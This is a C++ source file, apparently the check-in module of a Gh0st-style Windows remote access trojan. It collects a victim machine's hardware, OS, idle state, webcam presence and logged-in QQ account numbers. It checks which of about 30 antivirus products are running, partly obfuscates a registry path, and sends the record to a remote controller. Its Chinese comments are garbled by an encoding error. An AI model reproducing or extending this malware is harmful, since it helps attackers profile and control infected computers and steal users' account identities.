
#include <STDLIB.H>
#include <iphlpapi.h> //��������ͷ
#pragma comment ( lib, "iphlpapi.lib" ) 
/********************************************************************************************************

                                      _oo0oo_
                                     o8888888o
                                     88" . "88
                                     (| -_- |)
                                     0\  =  /0
                                   ___/`---'\___
                                 .' \\|     |// '.
                                / \\|||  :  |||// \
                               / _||||| -:- |||||- \
                              |   | \\\  -  /// |   |
                              | \_|  ''\---/''  |_/ |
                              \  .-\__  '-'  ___/-. /
                            ___'. .'  /--.--\  `. .'___
                         ."" '<  `.___\_<|>_/___.' >' "".
                        | | :  `- \`.;`\ _ /`;.`/ - ` : | |
                        \  \ `_.   \_ __\ /__ _/   .-` /  /
                    =====`-.____`.___ \_____/___.-`___.-'=====
                                      `=---='
                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                          ���汣��    ����BUG    �����޸�


********************************************************************************************************/

extern CHAR NtrServiceName[100];   //��������
extern CHAR NtrVersion[32];   //��������
extern CHAR NtrBuildtime[100];   //��������
// Get System Information CPU
DWORD CPUClockMhzt()
{
	char str1[256]="~M";
	char str2[256]="Hz";
	strcat(str1,str2);

	char xYKTm[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, xYKTm, &hKey);
	RegQueryValueEx(hKey, str1, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}


void GetHostRemark(LPTSTR lpBuffer, UINT uSize ,LPTSTR strSubKey)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,"Remark", REG_SZ, lpBuffer, NULL,uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
}


//����ϵͳ
BOOL GetNtVersionNumbers(DWORD&dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibraryW(L"ntdll.dll"))
    {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*,DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers)
        {
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer,&dwBuildNumber);
			dwBuildNumber&= 0x0ffff;
			bRet = TRUE;
        }
		
        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }
	
    return bRet;
}

//����QQ
char *GetQQ()
{
	char *szQQNum = new char[2048];
	memset(szQQNum, 0, 260);
	char szText[2048] = {0};
    char szQQNumber[2048] = {0};
    HWND hWnd = FindWindowA("CTXOPConntion_Class", NULL);
	
	while (hWnd)
	{
		char szClassName[MAX_PATH] = {0};
		GetClassName(hWnd, szClassName, MAX_PATH);
		if (strcmp(szClassName, "CTXOPConntion_Class") == 0)
		{	
			// �õ�����OP_12345678���ַ���
			if (hWnd)
			{
				GetWindowText(hWnd, szText, MAX_PATH);
			}
			// �õ�12345678 qq��
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			if (lstrlen(szQQNum) != 0)
			{	
				strcat(szQQNum, "|");
			}
			strcat(szQQNum, szQQNumber);
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
	}
	if (lstrlen(szQQNum) == 0)
	{
		strcpy(szQQNum, "Null");
	}
	return szQQNum;
}

//����
int GetNetwork()//��ȡ��������Mbps 
{
	DWORD dwSize = 0;
	DWORD dwRetVal = 0;
	DWORD speed = 0; 
	DWORD dwspeed = 0;
	MIB_IFTABLE *pIfTable;
	MIB_IFROW *pIfRow;       
	
	
	pIfTable = (MIB_IFTABLE *) malloc(sizeof (MIB_IFTABLE));
	if (pIfTable == NULL) 
	{
		return 1;
	}
	dwSize = sizeof (MIB_IFTABLE);
	if (GetIfTable(pIfTable, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) 
	{
		free( pIfTable);
		pIfTable = (MIB_IFTABLE *) malloc(dwSize);
		if (pIfTable == NULL) 
		{
			return 1;
		}
	}
	
	if ((dwRetVal = GetIfTable(pIfTable, &dwSize, FALSE)) == NO_ERROR) 
	{        
		pIfRow = (MIB_IFROW *) & pIfTable->table[0];
		speed = pIfRow->dwSpeed;
		dwspeed = speed/1000/1000; //mbps        
	} 
	if (pIfTable != NULL) 
	{
		free(pIfTable);
		pIfTable = NULL;
	}
	
	return dwspeed;
}

//////////////////////////////////////////////////////////
//ö����Ƶ�豸
/*************�ж���Ƶ��ͷ�ļ�*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
/**********************************/

//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM ���ʼ��
	/////////////////////    Step1        /////////////////////////////////
	//ö�ٲ����豸
	ICreateDevEnum *pCreateDevEnum;                          //�����豸ö����
	//�����豸ö�ٹ�����
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //Ҫ������Filter��Class ID
		NULL,                                                //��ʾFilter�����ۺ�
		CLSCTX_INPROC_SERVER,                                //����������COM����
		IID_ICreateDevEnum,                                  //��õĽӿ�ID
		(void**)&pCreateDevEnum);                            //�����Ľӿڶ����ָ��
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //ö�ټ�����ӿ�
	//��ȡ��Ƶ���ö����
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//������ȡ��Ƶ���ö��������ʹ�����´���
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //����ö������λ
	ULONG cFetched;
	IMoniker *pM;                                            //������ӿ�ָ��
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //��ȡ��һ���豸
	{
		IPropertyBag *pBag;                                  //����ҳ�ӿ�ָ��
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//��ȡ�豸����ҳ
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //������Ƕ���������
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//��ȡFriendlyName��ʽ����Ϣ
            if (hr == NOERROR) 
            {
				nCam++;
				SysFreeString(var.bstrVal);   //�ͷ���Դ���ر�Ҫע��
            }
            pBag->Release();                  //�ͷ�����ҳ�ӿ�ָ��
        }
        pM->Release();                        //�ͷż�����ӿ�ָ��
    }
	CoUninitialize();                   //ж��COM��
	return nCam;
}
//////////////////////////////////////////////////////////

bool IsWebCam()
{
	bool	bRet = false;
	
	if (EnumDevices()>0)
	{
        bRet = TRUE;
	}
	return bRet;
}


/////////////////ɱ����ʾ//////////////////////////////////
typedef struct
{
	char *Course;
	char *Name;
}AYSDFE;


AYSDFE g_Ayadfe_Datas[40] =
{
	{"360tray.exe",       "360��ȫ��ʿ"},
	{"360sd.exe",         "360ɱ��"},
	{"kxetray.exe",       "��ɽ����"},
	{"KSafeTray.exe",     "��ɽ��ȫ��ʿ"},
	{"QQPCRTP.exe",       "QQ���Թܼ�"},
	{"BaiduSd.exe",       "�ٶ�ɱ��"},
	{"baiduSafeTray.exe", "�ٶ���ʿ"},
	{"KvMonXP.exe",       "����"},
	{"RavMonD.exe",       "����"},
	{"QUHLPSVC.EXE",      "QuickHeal"},//ӡ��
	{"mssecess.exe",      "΢��MSE"},
	{"cfp.exe",           "Comodoɱ��"},
	{"SPIDer.exe",        "DR.WEB"},//��֩��
	{"acs.exe",           "Outpost"},
	{"V3Svc.exe",         "����ʿV3"},
	{"AYAgent.aye",       "��������"},
	{"avgwdsvc.exe",      "AVG"},
	{"f-secure.exe",      "F-Secure"},//�Ұ�ȫ
	{"avp.exe",           "����"},
	{"Mcshield.exe",      "�󿧷�"},
	{"egui.exe",          "NOD32"},
	{"knsdtray.exe",      "��ţ"},
	{"TMBMSRV.exe",       "����"},
	{"avcenter.exe",      "С��ɡ"},
	{"ashDisp.exe",       "Avast���簲ȫ"}, 
	{"rtvscan.exe",       "ŵ��"}, 
	{"remupd.exe",        "��è��ʿ"},
	{"vsserv.exe",        "BitDefender"},//BD  bdagent.exe
	{"PSafeSysTray.exe",  "PSafe������"},//����
	{"ad-watch.exe",      "Ad-watch�����"}, 
	{"K7TSecurity.exe",   "K7ɱ��"}, 
	{"UnThreat.exe",      "UnThreat"},//��������
	{"  ",    "  "}
	
};

char* GetVirus()
{	
	static char AllName[1024];
	int t=0;
	memset(AllName, 0, sizeof(AllName));
	while(1)
	{
		if (strstr(g_Ayadfe_Datas[t].Course, " " )  == 0 )
		{	
			if (GetProcessID(g_Ayadfe_Datas[t].Course)) 
			{
				lstrcat( AllName, g_Ayadfe_Datas[t].Name);
				lstrcat( AllName, " " );
			}
		}
		else
			break;
		t++;
	}
	
	if (strstr(AllName, " " )  == 0 )
	{	
		lstrcat(AllName , " Null ");
	}
	
	return AllName;
}


//����������Ϣ
int SendLoginInfo(CClientSocket *pClient, DWORD dwSpeed)
{
	// ��¼��Ϣ
	LOGININFO	LoginInfo;

	// ��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼

 	char strSubKey[MAX_PATH];

	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", NtrServiceName);



	// ���ӵ�IP��ַ
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));

	// ������
	GetHostRemark( LoginInfo.HostName, sizeof(LoginInfo.HostName),strSubKey);


	// ����ϵͳ
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ע��ת������
	GetNtVersionNumbers(LoginInfo.OsVerInfoEx.dwMajorVersion,LoginInfo.OsVerInfoEx.dwMinorVersion,LoginInfo.OsVerInfoEx.dwBuildNumber);
	
	// CPU
	LoginInfo.dwCPUClockMhz = CPUClockMhzt();
	SYSTEM_INFO SysInfo;//���ڻ�ȡCPU������
	GetSystemInfo(&SysInfo);
	LoginInfo.nCPUNumber = SysInfo.dwNumberOfProcessors;
	
	//�ڴ��С
    MEMORYSTATUSEX	MemInfo; //��GlobalMemoryStatusEx����ʾ2G�����ڴ�
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo.MemSize = (unsigned long)strMem;
	DWORDLONG FreeMemory = MemInfo.ullAvailPhys/1024/1024;
	LoginInfo.FreeMemSize = (unsigned long)FreeMemory;

	//Ӳ�̿ռ�
	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	ULONG nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10], strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,//�̷�
			&nTotalAvailableBytes,
			&nTotalBytes,//��Ӳ�̴�С
			&nTotalFreeBytes); //ʣ��Ӳ�̴�С
		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
    }
	// Ӳ��
	LoginInfo.DriverSize = nAllGB;
	// ����Ӳ��
	LoginInfo.FreeDriverSize = nFreeGB;


	//�û�
	LoginInfo.bIsActive = false;
	//�Ƿ�
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//��ȡ�ϴ����������ʱ�䡣
	if ((::GetTickCount()-lpi.dwTime)>1000*60*3)//5����
	{
		//��ǰϵͳ�Ѿ�������1����
        LoginInfo.bIsActive = true;
	}
	

	// Speed
	LoginInfo.dwSpeed = dwSpeed;


	//����QQ
	strcpy( LoginInfo.nQQ, GetQQ() );

	// ����
	LoginInfo.Speed = GetNetwork();

	//����ͷ
	LoginInfo.bIsWebCam = IsWebCam();

	// ɱ�����
    strcpy( LoginInfo.Virus, GetVirus() );
	
	//����
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", NtrServiceName);
	memset(LoginInfo.UpGroup,0,sizeof(LoginInfo.UpGroup));
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,"Group", REG_SZ, LoginInfo.UpGroup, NULL,lstrlen(LoginInfo.UpGroup), 0);

    //���߰汾
	strcpy(LoginInfo.szVersion, NtrVersion);

	//����ʱ��
	strcpy(LoginInfo.BuildTime, NtrBuildtime);

	int nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}

